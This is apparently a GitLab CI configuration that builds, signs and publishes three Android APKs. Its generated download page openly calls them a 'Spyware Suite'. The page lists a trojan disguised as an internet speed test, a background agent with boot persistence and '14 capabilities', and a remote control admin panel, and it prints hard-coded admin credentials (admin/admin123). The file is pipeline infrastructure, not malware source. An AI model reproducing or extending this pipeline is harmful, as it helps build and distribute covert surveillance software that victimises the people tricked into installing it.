image: ghcr.io/cirruslabs/android-sdk:34

variables:
  GRADLE_OPTS: "-Dorg.gradle.daemon=false -Dorg.gradle.parallel=true"
  ANDROID_SDK_ROOT: "/opt/android-sdk"
  GRADLE_VERSION: "8.5"
  ADMIN_USERNAME: "admin"
  ADMIN_PASSWORD: "admin123"

stages:
  - setup
  - build
  - test
  - sign
  - package
  - deploy

before_script:
  - |
    if ! command -v gradle &> /dev/null; then
      echo "Installing Gradle $GRADLE_VERSION..."
      wget -q "https://services.gradle.org/distributions/gradle-${GRADLE_VERSION}-bin.zip" -O /tmp/gradle.zip
      unzip -q /tmp/gradle.zip -d /opt/
      ln -sf /opt/gradle-${GRADLE_VERSION}/bin/gradle /usr/local/bin/gradle
      rm /tmp/gradle.zip
    fi
  - export GRADLE_USER_HOME=$(pwd)/.gradle
  - echo "sdk.dir=$ANDROID_SDK_ROOT" > local.properties
  - mkdir -p ~/.android && echo "### User Sources for Android SDK Manager" > ~/.android/repositories.cfg

cache:
  key: "android-sdk"
  paths:
    - .gradle/wrapper/
    - .gradle/caches/

setup:
  stage: setup
  script:
    - echo "Setup complete - Android SDK ready"
    - gradle --version
  cache:
    key: "android-sdk"
    paths:
      - .gradle/wrapper/
      - .gradle/caches/

build_agent_debug:
  stage: build
  needs: [setup]
  script:
    - echo "Building agent debug APK..."
    - gradle :agent:assembleDebug
  artifacts:
    paths:
      - agent/app/build/outputs/apk/debug/*.apk
    expire_in: 7 days
  cache:
    key: "gradle-cache"
    paths:
      - .gradle/caches/
      - .gradle/wrapper/

build_agent_release:
  stage: build
  needs: [setup]
  script:
    - echo "Building agent release APK..."
    - gradle :agent:assembleRelease
  artifacts:
    paths:
      - agent/app/build/outputs/apk/release/*.apk
    expire_in: 30 days
  cache:
    key: "gradle-cache"
    paths:
      - .gradle/caches/
      - .gradle/wrapper/

build_admin_debug:
  stage: build
  needs: [setup]
  script:
    - echo "Building admin debug APK..."
    - gradle :admin:assembleDebug
  artifacts:
    paths:
      - admin/app/build/outputs/apk/debug/*.apk
    expire_in: 7 days
  cache:
    key: "gradle-cache"
    paths:
      - .gradle/caches/
      - .gradle/wrapper/

build_admin_release:
  stage: build
  needs: [setup]
  script:
    - echo "Building admin release APK..."
    - gradle :admin:assembleRelease
  artifacts:
    paths:
      - admin/app/build/outputs/apk/release/*.apk
    expire_in: 30 days
  cache:
    key: "gradle-cache"
    paths:
      - .gradle/caches/
      - .gradle/wrapper/

build_speedmon_debug:
  stage: build
  needs: [setup]
  script:
    - echo "Building speedmon debug APK..."
    - gradle :speedmon:assembleDebug
  artifacts:
    paths:
      - speedmon/app/build/outputs/apk/debug/*.apk
    expire_in: 7 days
  cache:
    key: "gradle-cache"
    paths:
      - .gradle/caches/
      - .gradle/wrapper/

build_speedmon_release:
  stage: build
  needs: [setup]
  script:
    - echo "Building speedmon release APK..."
    - gradle :speedmon:assembleRelease
  artifacts:
    paths:
      - speedmon/app/build/outputs/apk/release/*.apk
    expire_in: 30 days
  cache:
    key: "gradle-cache"
    paths:
      - .gradle/caches/
      - .gradle/wrapper/

lint:
  stage: test
  needs: [build_agent_debug, build_admin_debug, build_speedmon_debug]
  script:
    - gradle :agent:lint :admin:lint :speedmon:lint
  artifacts:
    paths:
      - agent/app/build/reports/lint-results.html
      - agent/app/build/reports/lint-results.xml
      - admin/app/build/reports/lint-results.html
      - admin/app/build/reports/lint-results.xml
      - speedmon/app/build/reports/lint-results.html
      - speedmon/app/build/reports/lint-results.xml
    expire_in: 7 days

sign_apks:
  stage: sign
  needs: [build_agent_release, build_admin_release, build_speedmon_release]
  script:
    - |
      if [ -n "$KEYSTORE_BASE64" ] && [ -n "$KEYSTORE_PASSWORD" ] && [ -n "$KEY_ALIAS" ] && [ -n "$KEY_PASSWORD" ]; then
        echo "$KEYSTORE_BASE64" | base64 -d > release.keystore
        for apk in $(find . -name "*-release-unsigned.apk" -o -name "*-release.apk" | grep -v aligned); do
          aligned="${apk%.apk}-aligned.apk"
          signed="${apk%.apk}-signed.apk"
          zipalign -p 4 "$apk" "$aligned"
          apksigner sign --ks release.keystore --ks-pass "pass:$KEYSTORE_PASSWORD" --ks-key-alias "$KEY_ALIAS" --key-pass "pass:$KEY_PASSWORD" --out "$signed" "$aligned"
          echo "Signed: $signed"
          cp "$signed" "${apk%.apk}.apk"
        done
      else
        echo "No signing config - using unsigned APKs"
      fi
  artifacts:
    paths:
      - agent/app/build/outputs/apk/release/*.apk
      - admin/app/build/outputs/apk/release/*.apk
      - speedmon/app/build/outputs/apk/release/*.apk
    expire_in: 30 days

package_release:
  stage: package
  needs: [sign_apks]
  script:
    - mkdir -p release/
    - cp agent/app/build/outputs/apk/release/*.apk release/system-monitor-agent.apk 2>/dev/null || true
    - cp admin/app/build/outputs/apk/release/*.apk release/spyadmin-admin.apk 2>/dev/null || true
    - cp speedmon/app/build/outputs/apk/release/*.apk release/speedmon-user.apk 2>/dev/null || true
    - cp agent/app/build/outputs/apk/debug/*.apk release/system-monitor-agent-debug.apk 2>/dev/null || true
    - cp admin/app/build/outputs/apk/debug/*.apk release/spyadmin-admin-debug.apk 2>/dev/null || true
    - cp speedmon/app/build/outputs/apk/debug/*.apk release/speedmon-user-debug.apk 2>/dev/null || true
    - cd release && sha256sum *.apk > SHA256SUMS.txt && cd ..
    - cat release/SHA256SUMS.txt
  artifacts:
    paths:
      - release/
    expire_in: 30 days

deploy_pages:
  stage: deploy
  needs: [package_release]
  script:
    - mkdir -p public/
    - cp -r release/* public/
    - |
      cat > public/index.html << 'HTMLEOF'
      <!DOCTYPE html>
      <html>
      <head>
        <title>Spyware Suite - APK Downloads</title>
        <style>
          body { font-family: monospace; max-width: 900px; margin: 50px auto; padding: 20px; background: #0a0a0a; color: #0f0; }
          h1 { color: #0f0; border-bottom: 1px solid #0f0; padding-bottom: 10px; }
          .apk { margin: 20px 0; padding: 15px; border: 1px solid #0f0; }
          .apk a { color: #0f0; text-decoration: none; font-weight: bold; }
          .apk a:hover { text-decoration: underline; }
          .meta { color: #888; font-size: 0.9em; }
          .info { background: #1a1a1a; padding: 15px; border: 1px solid #0f0; margin: 20px 0; }
          .cred { background: #1a1a1a; padding: 15px; border: 1px solid #f00; margin: 20px 0; color: #f88; }
          .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; }
        </style>
      </head>
      <body>
        <h1>Spyware Suite — Built $(date -u)</h1>
        <div class="cred">
          <strong>Admin Panel Credentials:</strong><br>
          Username: admin<br>
          Password: admin123
        </div>
        <div class="grid">
          <div class="apk">
            <a href="speedmon-user.apk">📱 speedmon-user.apk</a> — Internet Speed Meter (Trojan)
            <div class="meta">Package: com.speedmon | Disguised as network speed test</div>
          </div>
          <div class="apk">
            <a href="spyadmin-admin.apk">🛠 spyadmin-admin.apk</a> — Admin Control Panel
            <div class="meta">Package: com.spyadmin | Full remote control interface</div>
          </div>
          <div class="apk">
            <a href="system-monitor-agent.apk">🕷 system-monitor-agent.apk</a> — Background Agent
            <div class="meta">Package: com.system.monitor | 14 capabilities, boot persistence</div>
          </div>
        </div>
        <div class="meta">SHA256 checksums in <a href="SHA256SUMS.txt">SHA256SUMS.txt</a></div>
      </body>
      </html>
      HTMLEOF
  artifacts:
    paths:
      - public/
    expire_in: 30 days
  rules:
    - if: $CI_COMMIT_BRANCH == "main"
    - if: $CI_COMMIT_TAG

release_signed:
  stage: deploy
  needs: [package_release]
  when: manual
  script: |
    echo "Manual release triggered"
    echo "APKs available at: https://gitlab.com/daveXcodiene/code/-/jobs/artifacts/main/raw/release/?job=package_release"
  rules:
    - if: $CI_COMMIT_BRANCH == "main"